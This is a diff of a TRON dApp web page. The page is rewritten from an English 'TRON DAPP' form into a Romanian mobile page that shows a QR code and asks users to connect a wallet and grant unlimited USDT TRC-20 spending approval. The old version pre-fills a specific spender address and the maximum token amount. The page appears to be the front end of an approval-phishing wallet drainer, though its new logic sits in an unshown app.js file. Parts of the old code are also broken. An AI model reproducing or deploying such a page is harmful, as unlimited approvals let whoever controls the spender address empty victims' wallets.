@@ -1,91 +1,56 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="ro">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>TRON DAPP</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Permisiuni USDT TRC-20 - TRON</title>
 
-<style>
-body{font-family:system-ui;background:#0b1220;color:#fff;padding:20px}
-.card{background:#111827;padding:16px;border-radius:12px;margin-bottom:12px}
-button{width:100%;padding:12px;border:0;border-radius:8px;background:#2563eb;color:#fff}
-input{width:100%;padding:10px;margin-top:8px;border-radius:8px}
-pre{background:#0f172a;padding:10px;border-radius:10px;overflow:auto}
-.ok{color:#22c55e}
-.bad{color:#ef4444}
-</style>
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#0f172a">
+
+    <!-- Librărie pentru generarea codului QR -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .card { background: #1e293b; border: 1px solid #334155; border-radius: 16px; padding: 25px; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.4); text-align: center; }
+        
+        h2 { margin-top: 0; font-size: 20px; color: #fff; }
+        .desc { font-size: 13px; color: #94a3b8; margin-bottom: 20px; }
+        
+        label { display: block; text-align: left; font-size: 13px; color: #cbd5e1; margin-top: 15px; font-weight: 500; }
+        
+        #qrcode { display: flex; justify-content: center; margin: 15px 0; background: white; padding: 15px; border-radius: 8px; }
+        .tron-address { font-size: 12px; background: #0f172a; padding: 10px; border-radius: 6px; border: 1px dashed #334155; word-break: break-all; margin-top: 10px; color: #38bdf8; }
+        
+        .main-btn { background-color: #2563eb; color: white; border: none; padding: 14px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; font-size: 16px; transition: background 0.2s; }
+        .main-btn:hover { background-color: #1d4ed8; }
+        .main-btn:disabled { background-color: #475569; cursor: not-allowed; }
+
+        .status { margin-top: 20px; font-size: 13px; color: #38bdf8; word-break: break-all; padding: 10px; border-radius: 8px; background: rgba(56, 189, 248, 0.1); display: none; }
+    </style>
 </head>
-
 <body>
 
 <div class="card">
-<h3>TRON DAPP</h3>
-<p>Status: <span id="status" class="bad">DISCONNECTED</span></p>
-<p>Wallet: <b id="wallet">—</b></p>
+    <h2>Permisiuni USDT TRC-20</h2>
+    <div class="desc">Rețeaua TRON (Aprobare Nelimitată)</div>
+    
+    <label>Scanează codul QR cu telefonul:</label>
+    <div id="qrcode"></div>
+    
+    <div class="tron-address" id="tronAddressText">Se încarcă adresa...</div>
+    
+    <button id="connectTronBtn" class="main-btn" onclick="connectTronWallet()">Conectează Portofel TRON</button>
 
-<button onclick="connect()">CONNECT WALLET</button>
+    <div id="tronApproveSection" style="display:none; margin-top: 15px;">
+        <button id="approveTronBtn" class="main-btn" style="background-color: #16a34a;" onclick="handleTronUnlimitedApprove()">Acordă Approve Nelimitat</button>
+    </div>
+
+    <div class="status" id="tronStatusText"></div>
 </div>
 
-<div class="card">
-<input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
-<input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>
-<button onclick="approve()">APPROVE USDT</button>
-<pre id="log"></pre>
-</div>
-
-<script>
-
-const USDT="TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
-let wallet=null;
-
-function hasTron(){
-  return window.tronWeb && window.tronWeb.defaultAddress?.base58;
-}
-
-/* CONNECT */
-async function connect(){
-
-  if(!hasTron()){
-    alert("Open in TronLink or Trust Wallet dApp browser");
-    return;
-  }
-
-  wallet=window.tronWeb.defaultAddress.base58;
-
-  document.getElementById("wallet").innerText=wallet;
-  document.getElementById("status").innerText="CONNECTED";
-  document.getElementById("status").className="ok";
-}
-
-/* CONTRACT */
-async function contract(){
-  return await window.tronWeb.contract().at(USDT);
-}
-
-/* APPROVE REAL */
-async function approve(){
-  try{
-
-    const spender=document.getElementById("spender").value;
-    const amount=document.getElementById("amount").value;
-
-    if(!spender||!amount) return alert("fill fields");
-
-    const c=await contract();
-
-    const value=BigInt(Math.floor(Number(amount)*1e6));
-
-    const tx=await c.approve(spender,value.toString()).send();
-
-    document.getElementById("log").innerText=
-      "TX SUCCESS:\n"+tx;
-
-  }catch(e){
-    document.getElementById("log").innerText="error / reject";
-  }
-}
-
-</script>
-
+<script src="app.js"></script>
 </body>
 </html>
